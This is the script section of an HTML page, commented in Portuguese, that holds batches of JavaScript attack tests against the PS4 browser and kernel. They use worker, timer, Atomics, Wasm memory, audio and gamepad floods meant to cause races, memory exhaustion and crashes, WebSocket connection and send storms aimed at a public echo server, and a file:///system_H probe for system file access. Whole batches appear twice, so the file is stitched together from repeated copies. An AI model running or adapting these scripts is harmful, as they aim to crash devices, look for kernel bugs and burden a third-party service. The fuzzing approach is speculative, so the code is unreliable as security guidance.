        // Alvo: int_thread_get (Interrupções)
        // Usa setTimeout(0) aninhado para gerar carga de interrupção de software.
        function runTimerStorm() {
            log("[KERNEL] Iniciando Timer Storm...");
            
            let count = 0;
            const handlers = [];
            
            function storm() {
                count++;
                if (count % 10000 === 0) log(`Timers disparados: ${count}`);
                
                // Reagendar imediatamente
                // No PS4, timers rápidos geram carga de IRQ significativa
                if (count < 100000) setTimeout(storm, 0);
            }
            
            // Lança múltiplos "fios" de timers
            for(let i=0; i<50; i++) setTimeout(storm, 0);
            log("50 cadeias de timers iniciadas.");
        }

        // --- TESTE 6: TCP Window Saturation ---
        // Alvo: Mbuf memory exhaustion
        // Envia dados sem parar via WebSocket sem ler a resposta, forçando buffer no Kernel.
        function runTCPWindow() {
            log("[KERNEL] Saturando TCP Window...");
            
            const ws = new WebSocket("wss://echo.websocket.org");
            const chunk = new Uint8Array(64 * 1024); // 64KB
            
            ws.onopen = () => {
                log("Conectado. Enchendo buffers...");
                
                // Loop de envio agressivo
                const interval = setInterval(() => {
                    // Se o buffer do *navegador* estiver cheio, o Kernel já está a bloquear.
                    // Continuamos a empurrar.
                    if (ws.bufferedAmount < 10 * 1024 * 1024) {
                        ws.send(chunk);
                        ws.send(chunk);
                        ws.send(chunk);
                    }
                }, 1);
                
                setTimeout(() => {
                    clearInterval(interval);
                    ws.close();
                    log("Teste TCP finalizado.");
                }, 10000);
            };
        }
// --- TESTE 1: scePthreadSetspecific Memory Error ---
        // Alvo: Falha na alocação interna de TLS (Libkernel 0x41B09)
        // Intl usa dados específicos da thread para cache de locale.
        function runTLSStress() {
            log("[WebKit] Estressando TLS via Intl...");
            
            const workerCode = `
                onmessage = () => {
                    const trash = [];
                    // Cria milhares de objetos que alocam no TLS da thread
                    try {
                        for(let i=0; i<5000; i++) {
                            // Locales exóticos forçam carregamento de dados diferentes
                            trash.push(new Intl.Collator("zh-u-co-pinyin")); 
                            trash.push(new Intl.DateTimeFormat("ar-SA"));
                        }
                    } catch(e) {}
                    postMessage("Done");
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança muitos workers para consumir a tabela de TLS global
            for(let i=0; i<20; i++) {
                new Worker(url).postMessage("start");
            }
            log("TLS Stress iniciado.");
        }

        // --- TESTE 2: Console Trace Buffer Overflow ---
        // Alvo: "sprintf_s: buffer overflow" e logging do sistema.
        // console.trace() gera uma stack trace que pode ser muito longa.
        function runConsoleTrace() {
            log("[WebKit] Atacando Console Logging Bridge...");
            
            function recurse(depth) {
                if (depth > 0) recurse(depth - 1);
                else {
                    // No fundo da recursão (Stack gigante), chama trace
                    // O sistema tenta formatar a stack trace para enviar ao log
                    console.trace("Deep Stack Trace Trigger");
                }
            }
            
            try {
                // Profundidade suficiente para gerar string > 4KB/8KB mas sem estourar JS stack
                recurse(500); 
                log("Trace enviado.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 3: SharedWorkerProxy Destructor Race ---
        // Alvo: SharedWorkerThreadProxy.cpp
        // Tenta destruir o proxy enquanto ele processa mensagens.
        function runSharedProxyDestruct() {
            log("[WebKit] Iniciando Proxy Destructor Race...");
            
            const workerCode = `
                onmessage = (e) => {
                    const port = e.ports[0];
                    // Bombardeia a porta de volta
                    setInterval(() => port.postMessage(new ArrayBuffer(100)), 0);
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let i = 0;
            const interval = setInterval(() => {
                const mc = new MessageChannel();
                const sw = new SharedWorker(url, "race_" + i);
                sw.port.postMessage("init", [mc.port2]);
                
                // Fecha a porta local imediatamente (lado do proxy)
                // enquanto o worker bombardeia o outro lado
                setTimeout(() => {
                    sw.port.close(); // Tenta invalidar o proxy
                    mc.port1.close();
                }, Math.random() * 10);
                
                i++;
                if (i % 50 === 0) log(`Proxies destruídos: ${i}`);
                if (i > 500) clearInterval(interval);
            }, 20);
        }

        // --- TESTE 4: vm.budgets.mlock_total Exhaustion ---
        // Alvo: Limite de memória "wired" (mlock_total).
        // WebAssembly SharedMemory usa memória wired.
        function runMlockFrag() {
            log("[KERNEL] Esgotando Mlock Budget...");
            
            if (!window.WebAssembly) return log("Wasm off.");
            
            const memories = [];
            // Tenta alocar até falhar
            const interval = setInterval(() => {
                try {
                    // 16MB Shared (Wired)
                    const m = new WebAssembly.Memory({initial: 256, shared: true});
                    // Toca na memória para forçar page fault e lock real
                    new Int32Array(m.buffer)[0] = 1;
                    memories.push(m);
                    
                    if (memories.length % 5 === 0) log(`Alocados: ${memories.length * 16} MB Wired`);
                } catch(e) {
                    log("Limite atingido (OOM). Tentando fragmentar...");
                    
                    // Liberta alguns aleatórios para criar buracos
                    if (memories.length > 10) {
                        memories.splice(0, 5); // Remove 5 antigos
                    }
                }
            }, 100);
        }

        // --- TESTE 5: Socket 'Connection In Progress' Race ---
        // Alvo: "connection already in progress" (Libc).
        // Tenta confundir o estado do socket TCP não bloqueante.
        function runConnRace() {
            log("[KERNEL] Iniciando Socket Connect Race...");
            
            const url = "wss://echo.websocket.org";
            let ws;
            
            const interval = setInterval(() => {
                try {
                    // Tenta criar socket
                    ws = new WebSocket(url);
                    
                    // Fecha IMEDIATAMENTE (antes do SYN-ACK ou Handshake)
                    // O Kernel fica num estado transiente
                    ws.close();
                    
                    // Tenta reabrir imediatamente (pode reusar a estrutura interna?)
                    ws = new WebSocket(url);
                } catch(e) {}
            }, 5); // Muito rápido
            
            setTimeout(() => {
                clearInterval(interval);
                if(ws) ws.close();
                log("Socket Race finalizada.");
            }, 5000);
        }

        // --- TESTE 6: HID Driver Ring Buffer Overflow ---
        // Alvo: "hmd_cr:over write pos %d" (Kernel).
        // Sobrecarga o buffer de comandos do driver de input.
        function runHIDRingBuffer() {
            log("[KERNEL] Inundando HID Ring Buffer...");
            
            window.addEventListener("gamepadconnected", (e) => {
                const gp = e.gamepad;
                log(`Gamepad ${gp.index} detetado. Atacando...`);
                
                if (gp.vibrationActuator) {
                    // Loop síncrono de comandos
                    // Tenta escrever mais rápido que a interrupção do hardware lê
                    setInterval(() => {
                        gp.vibrationActuator.playEffect("dual-rumble", {
                            duration: 100,
                            strongMagnitude: 1.0,
                            weakMagnitude: 1.0
                        });
                        // Intercala com outra chamada de API para estressar o lock do driver
                        navigator.getGamepads(); 
                    }, 0);
                }
            });
            
            log("Pressione um botão no controle.");
        }
// --- TESTE 1: libunwind Exception Cross-Boundary ---
        // Alvo: "_Unwind_Resume_or_Rethrow() called ... unexpectedly"
        // Tenta quebrar a pilha de chamadas misturando exceções JS, Promessas e (se possível) Wasm.
        function runUnwindCrash() {
            log("[WebKit] Atacando libunwind (Stack Unwinding)...");
            
            async function recursiveThrow(depth) {
                if (depth > 0) {
                    try {
                        await recursiveThrow(depth - 1);
                    } catch (e) {
                        // Relança a exceção para forçar o 'unwind' de múltiplos frames
                        // Mistura com await para criar frames async (mais complexos para a libunwind)
                        throw e; 
                    }
                } else {
                    // Ponto de quebra
                    throw new Error("BOOM");
                }
            }

            // Profundidade agressiva
            recursiveThrow(2000).catch(e => log("Unwind completado (Seguro)."));
            log("Recursão de exceções iniciada.");
        }

        // --- TESTE 2: SceNKBMalloc Coalesce Race ---
        // Alvo: "SceNKBMalloc", "coalesce"
        // Tenta criar buracos na memória e preenchê-los concorrentemente para confundir a fusão de blocos.
        function runBmallocCoalesce() {
            log("[WebKit] Atacando bmalloc Coalesce...");
            
            const workerCode = `
                onmessage = (e) => {
                    const arr = [];
                    // Aloca
                    for(let i=0; i<10000; i++) arr.push(new ArrayBuffer(128));
                    
                    // Liberta em padrão "Xadrez" (Um sim, um não)
                    // Isso deixa muitos blocos livres isolados
                    for(let i=0; i<10000; i+=2) arr[i] = null;
                    
                    // Agora liberta os vizinhos para forçar COALESCE (Fusão) em massa
                    // Se fizermos isso enquanto outra thread aloca, pode haver race
                    for(let i=1; i<10000; i+=2) arr[i] = null;
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança 4 workers para competir no mesmo Heap
            for(let i=0; i<4; i++) new Worker(url).postMessage("go");
            log("Heap Coalescing Race iniciada.");
        }

        // --- TESTE 3: SharedWorkerProxy Destructor Race ---
        // Alvo: "SharedWorkerThreadProxy.cpp"
        // Tenta destruir o Worker enquanto o Proxy C++ ainda está a processar mensagens.
        function runProxyDestruct() {
            log("[WebKit] Atacando SharedWorker Proxy...");
            const url = URL.createObjectURL(new Blob(["onconnect=function(e){var p=e.ports[0];p.onmessage=function(m){p.postMessage(m.data)}}"],{type:"text/javascript"}));
            
            let i = 0;
            const interval = setInterval(() => {
                const sw = new SharedWorker(url, "race_"+i);
                sw.port.start();
                sw.port.postMessage("ping");
                
                // O GC ou navegação destrói o handle JS.
                // Mas o Proxy C++ pode estar vivo. 
                // Forçamos carga e esquecemos a referência.
                i++;
                if(i > 500) { clearInterval(interval); log("Proxy Race terminada."); }
            }, 5);
        }

        // --- TESTE 4: RWLock Reader Starvation ---
        // Alvo: "rdlock error", "wrlock error"
        // Cria muitos leitores (Readers) e um escritor (Writer) para testar a prioridade do lock.
        function runRWLockStarve() {
            log("[KERNEL] Atacando RWLock (Reader Starvation)...");
            
            if(!window.SharedArrayBuffer) return log("SAB off.");
            const sab = new SharedArrayBuffer(4);
            const view = new Int32Array(sab);
            
            const readerCode = `
                onmessage = (e) => {
                    const v = new Int32Array(e.data);
                    // Leitores agressivos (Atomic Load é apenas leitura de memória, mas simula acesso)
                    // Em syscalls reais, leituras bloqueiam escritas.
                    while(true) Atomics.load(v, 0);
                }
            `;
            
            // Lança 20 leitores
            const rUrl = URL.createObjectURL(new Blob([readerCode], {type:"text/javascript"}));
            for(let i=0; i<20; i++) new Worker(rUrl).postMessage(sab);
            
            // Lança 1 escritor
            setInterval(() => {
                // Tenta escrever (Writer)
                Atomics.store(view, 0, Math.random());
            }, 0);
            
            log("RWLock War iniciada.");
        }

        // --- TESTE 5: TLS Leftover Data Leak ---
        // Alvo: "Thread %p has exited with leftover thread-specific data"
        // Cria threads que alocam TLS e morrem sem limpar, enchendo o kernel de lixo.
        function runTLSLeakDeep() {
            log("[KERNEL] Injetando TLS Leftover Data...");
            
            const workerCode = `
                onmessage = () => {
                    // Aloca TLS usando Intl (ICU data)
                    const x = new Intl.DateTimeFormat('zh-Hans-CN-u-nu-hanidec');
                    // Não fazemos nada, apenas terminamos.
                    // O sistema deve limpar. O log diz que as vezes falha.
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) new Worker(url).postMessage("go");
                count += 20;
                if(count % 500 === 0) log(`Threads TLS descartadas: ${count}`);
                if(count > 10000) clearInterval(interval);
            }, 50);
        }

        // --- TESTE 6: _tcb_set() Failure Stress ---
        // Alvo: "_tcb_set() failed"
        // TCB (Thread Control Block) é definido na criação da thread.
        // Falhar aqui significa que o registo FS/GS (segmento) não pôde ser definido.
        function runTCBFail() {
            log("[KERNEL] Forçando falha em _tcb_set()...");
            
            // Tenta criar threads no limite máximo de frequência
            const workerCode = `postMessage('ok');`;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            const workers = [];
            const interval = setInterval(() => {
                // Cria em lote
                for(let i=0; i<50; i++) {
                    const w = new Worker(url);
                    workers.push(w);
                }
                
                // Mata em lote (Liberta TCBs)
                while(workers.length > 0) {
                    workers.pop().terminate();
                }
                // O churn (agitação) na tabela de segmentos GDT/LDT do kernel pode causar a falha.
            }, 10);
            
            setTimeout(() => { clearInterval(interval); log("TCB Stress parado."); }, 5000);
        }
// --- TESTE 1: libunwind Exception Cross-Boundary ---
        // Alvo: "_Unwind_Resume_or_Rethrow() called ... unexpectedly"
        // Tenta quebrar a pilha de chamadas misturando exceções JS, Promessas e (se possível) Wasm.
        function runUnwindCrash() {
            log("[WebKit] Atacando libunwind (Stack Unwinding)...");
            
            async function recursiveThrow(depth) {
                if (depth > 0) {
                    try {
                        await recursiveThrow(depth - 1);
                    } catch (e) {
                        // Relança a exceção para forçar o 'unwind' de múltiplos frames
                        // Mistura com await para criar frames async (mais complexos para a libunwind)
                        throw e; 
                    }
                } else {
                    // Ponto de quebra
                    throw new Error("BOOM");
                }
            }

            // Profundidade agressiva
            recursiveThrow(2000).catch(e => log("Unwind completado (Seguro)."));
            log("Recursão de exceções iniciada.");
        }

        // --- TESTE 2: SceNKBMalloc Coalesce Race ---
        // Alvo: "SceNKBMalloc", "coalesce"
        // Tenta criar buracos na memória e preenchê-los concorrentemente para confundir a fusão de blocos.
        function runBmallocCoalesce() {
            log("[WebKit] Atacando bmalloc Coalesce...");
            
            const workerCode = `
                onmessage = (e) => {
                    const arr = [];
                    // Aloca
                    for(let i=0; i<10000; i++) arr.push(new ArrayBuffer(128));
                    
                    // Liberta em padrão "Xadrez" (Um sim, um não)
                    // Isso deixa muitos blocos livres isolados
                    for(let i=0; i<10000; i+=2) arr[i] = null;
                    
                    // Agora liberta os vizinhos para forçar COALESCE (Fusão) em massa
                    // Se fizermos isso enquanto outra thread aloca, pode haver race
                    for(let i=1; i<10000; i+=2) arr[i] = null;
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança 4 workers para competir no mesmo Heap
            for(let i=0; i<4; i++) new Worker(url).postMessage("go");
            log("Heap Coalescing Race iniciada.");
        }

        // --- TESTE 3: SharedWorkerProxy Destructor Race ---
        // Alvo: "SharedWorkerThreadProxy.cpp"
        // Tenta destruir o Worker enquanto o Proxy C++ ainda está a processar mensagens.
        function runProxyDestruct() {
            log("[WebKit] Atacando SharedWorker Proxy...");
            const url = URL.createObjectURL(new Blob(["onconnect=function(e){var p=e.ports[0];p.onmessage=function(m){p.postMessage(m.data)}}"],{type:"text/javascript"}));
            
            let i = 0;
            const interval = setInterval(() => {
                const sw = new SharedWorker(url, "race_"+i);
                sw.port.start();
                sw.port.postMessage("ping");
                
                // O GC ou navegação destrói o handle JS.
                // Mas o Proxy C++ pode estar vivo. 
                // Forçamos carga e esquecemos a referência.
                i++;
                if(i > 500) { clearInterval(interval); log("Proxy Race terminada."); }
            }, 5);
        }

        // --- TESTE 4: RWLock Reader Starvation ---
        // Alvo: "rdlock error", "wrlock error"
        // Cria muitos leitores (Readers) e um escritor (Writer) para testar a prioridade do lock.
        function runRWLockStarve() {
            log("[KERNEL] Atacando RWLock (Reader Starvation)...");
            
            if(!window.SharedArrayBuffer) return log("SAB off.");
            const sab = new SharedArrayBuffer(4);
            const view = new Int32Array(sab);
            
            const readerCode = `
                onmessage = (e) => {
                    const v = new Int32Array(e.data);
                    // Leitores agressivos (Atomic Load é apenas leitura de memória, mas simula acesso)
                    // Em syscalls reais, leituras bloqueiam escritas.
                    while(true) Atomics.load(v, 0);
                }
            `;
            
            // Lança 20 leitores
            const rUrl = URL.createObjectURL(new Blob([readerCode], {type:"text/javascript"}));
            for(let i=0; i<20; i++) new Worker(rUrl).postMessage(sab);
            
            // Lança 1 escritor
            setInterval(() => {
                // Tenta escrever (Writer)
                Atomics.store(view, 0, Math.random());
            }, 0);
            
            log("RWLock War iniciada.");
        }

        // --- TESTE 5: TLS Leftover Data Leak ---
        // Alvo: "Thread %p has exited with leftover thread-specific data"
        // Cria threads que alocam TLS e morrem sem limpar, enchendo o kernel de lixo.
        function runTLSLeakDeep() {
            log("[KERNEL] Injetando TLS Leftover Data...");
            
            const workerCode = `
                onmessage = () => {
                    // Aloca TLS usando Intl (ICU data)
                    const x = new Intl.DateTimeFormat('zh-Hans-CN-u-nu-hanidec');
                    // Não fazemos nada, apenas terminamos.
                    // O sistema deve limpar. O log diz que as vezes falha.
                    close();
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            let count = 0;
            const interval = setInterval(() => {
                for(let i=0; i<20; i++) new Worker(url).postMessage("go");
                count += 20;
                if(count % 500 === 0) log(`Threads TLS descartadas: ${count}`);
                if(count > 10000) clearInterval(interval);
            }, 50);
        }

        // --- TESTE 6: _tcb_set() Failure Stress ---
        // Alvo: "_tcb_set() failed"
        // TCB (Thread Control Block) é definido na criação da thread.
        // Falhar aqui significa que o registo FS/GS (segmento) não pôde ser definido.
        function runTCBFail() {
            log("[KERNEL] Forçando falha em _tcb_set()...");
            
            // Tenta criar threads no limite máximo de frequência
            const workerCode = `postMessage('ok');`;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            const workers = [];
            const interval = setInterval(() => {
                // Cria em lote
                for(let i=0; i<50; i++) {
                    const w = new Worker(url);
                    workers.push(w);
                }
                
                // Mata em lote (Liberta TCBs)
                while(workers.length > 0) {
                    workers.pop().terminate();
                }
                // O churn (agitação) na tabela de segmentos GDT/LDT do kernel pode causar a falha.
            }, 10);
            
            setTimeout(() => { clearInterval(interval); log("TCB Stress parado."); }, 5000);
        }
// --- TESTE 1: C++ Static Init Guard Deadlock ---
        // Alvo: "__cxa_guard_abort failed to release mutex"
        // Tenta falhar a inicialização de um Singleton C++ (Static Local)
        function runStaticGuard() {
            log("[WebKit] Atacando C++ Static Guard...");
            
            const workerCode = `
                onmessage = () => {
                    // Tenta acessar APIs que usam Singletons internos (Lazy Init)
                    // Intl, Font Loading, Canvas Contexts
                    try {
                        // Cria pressão para forçar falha no 'new' interno
                        const junk = new ArrayBuffer(10 * 1024 * 1024); 
                        
                        // Acessa API complexa pela primeira vez na thread
                        const fmt = new Intl.RelativeTimeFormat('en', { style: 'long' });
                        const str = fmt.format(1, 'day');
                        
                        postMessage(str);
                    } catch(e) {
                        // Se o init falhar e o guard não liberar -> Deadlock na proxima tentativa
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança múltiplos workers para competir pelo lock de init estático (se for global/shared)
            for(let i=0; i<20; i++) {
                new Worker(url).postMessage("go");
            }
            log("Concorrência de Inicialização Estática iniciada.");
        }

        // --- TESTE 2: Socket 'Already Connected' Race ---
        // Alvo: "already connected" (Libc)
        function runSocketState() {
            log("[WebKit] Socket State Race...");
            
            const url = "wss://echo.websocket.org";
            let ws;
            
            const interval = setInterval(() => {
                // Tenta criar socket e, num timing preciso, fechar ou re-iniciar
                try {
                    ws = new WebSocket(url);
                    // O kernel inicia o handshake (SYN_SENT)
                    
                    // Tenta 'confundir' o objeto JS ou a referência do Kernel
                    // Em JS puro é difícil chamar connect() duas vezes, mas podemos
                    // tentar destruir o objeto e criar outro que ocupe o mesmo slot?
                    ws.close();
                    
                    // Race: Socket fechando vs Handshake chegando
                } catch(e) {}
            }, 2);
            
            setTimeout(() => {
                clearInterval(interval);
                log("Socket Race finalizada.");
            }, 3000);
        }

        // --- TESTE 3: SceNKBMalloc Size Class Thrashing ---
        // Alvo: SceNKBMalloc Internal Logic
        // Alocadores costumam ter "Size Classes" (ex: blocos de 16, 32, 48 bytes).
        // Alocar padrões que saltam entre classes pode fragmentar ou confundir o cache.
        function runBmallocTrash() {
            log("[WebKit] Thrashing Bmalloc Size Classes...");
            
            const allocations = [];
            
            try {
                for(let i=0; i<10000; i++) {
                    // Aloca tamanhos crescentes: 16, 17, 18... 
                    // Isso força o uso de múltiplas classes de tamanho diferentes
                    // e impede otimizações de cache de tamanho fixo.
                    allocations.push(new ArrayBuffer(16 + (i % 256)));
                    
                    if (i % 3 === 0) allocations.pop(); // Liberta o último (LIFO)
                    if (i % 7 === 0) allocations.shift(); // Liberta o primeiro (FIFO)
                }
                log("Bmalloc stress completo.");
            } catch(e) {
                log("Erro: " + e.message);
            }
        }

        // --- TESTE 4: UMTX Unlock Error ---
        // Alvo: "unlock error" em thr_umtx.c (Kernel)
        // UMTX (User Mutex) é a base dos Atomics.wait/notify.
        function runUMTXUnlock() {
            log("[KERNEL] Forçando UMTX Unlock Error...");
            
            if(!window.SharedArrayBuffer) return log("SAB off.");
            
            const sab = new SharedArrayBuffer(4);
            const view = new Int32Array(sab);
            
            const workerCode = `
                onmessage = (e) => {
                    const v = new Int32Array(e.data);
                    // Tenta notificar (unlock/wake) um endereço que não está a dormir corretamente
                    // ou cujo estado de memória foi alterado
                    while(true) {
                        Atomics.notify(v, 0, 1);
                    }
                }
            `;
            const url = URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}));
            
            // Lança workers notificadores
            for(let i=0; i<5; i++) new Worker(url).postMessage(sab);
            
            // Na main thread, altera o valor atómico violentamente
            // para tentar dessincronizar o estado do futex no kernel
            setInterval(() => {
                view[0] = Math.random() * 1000;
            }, 0);
            
            log("UMTX Attack em andamento.");
        }

        // --- TESTE 5: Audio Co-Processor (ACP) Fuzzing ---
        // Alvo: "acp%d: PC = ..." (Hardware Debug Log)
        // Tenta crashar o DSP de áudio enviando parâmetros inválidos.
        function runACPFuzz() {
            log("[KERNEL] Fuzzing Audio Co-Processor...");
            
            if(!window.AudioContext) return log("Audio off.");
            
            try {
                const ctx = new AudioContext();
                const osc = ctx.createOscillator();
                const gain = ctx.createGain();
                
                osc.connect(gain);
                gain.connect(ctx.destination);
                
                // Automação de parâmetros rápida e valores extremos (NaN, Infinity, Max Float)
                // O ACP lê estes valores para processar o DSP
                const param = gain.gain;
                
                const fuzzer = setInterval(() => {
                    try {
                        const time = ctx.currentTime;
                        // Valores que podem bugar FPUs de hardware dedicados
                        param.setValueAtTime(3.4e38, time); // Max Float
                        param.linearRampToValueAtTime(-1.0, time + 0.01); // Negativo
                        param.exponentialRampToValueAtTime(0.00001, time + 0.02);
                        // param.setValueAtTime(NaN, time + 0.03); // WebKit filtra NaN, mas tentamos
                    } catch(e) {}
                }, 10);
                
                osc.start();
                
                setTimeout(() => {
                    clearInterval(fuzzer);
                    ctx.close();
                    log("ACP Fuzz finalizado.");
                }, 3000);
                
            } catch(e) {
                log("Erro Audio: " + e.message);
            }
        }

        // --- TESTE 6: /system_H Path Probe ---
        // Alvo: "/system_H" (String misteriosa no Libkernel)
        function runSystemH() {
            log("[KERNEL] Sondando /system_H...");
            
            // Tenta acessar via Fetch (File protocol)
            // Se o navegador tiver acesso a leitura de sistema, pode retornar algo
            const paths = ["/system_H", "file:///system_H"];
            
            paths.forEach(p => {
                fetch(p).then(r => {
                    log(`HIT! ${p} status: ${r.status}`);
                }).catch(e => {
                    // Erro é esperado, mas o tipo de erro (Network vs Access Denied) importa
                    // log(`Falha em ${p}: ${e.name}`);
                });
            });
            
            log("Sonda lançada.");
        }





    </script>
</body>
</html>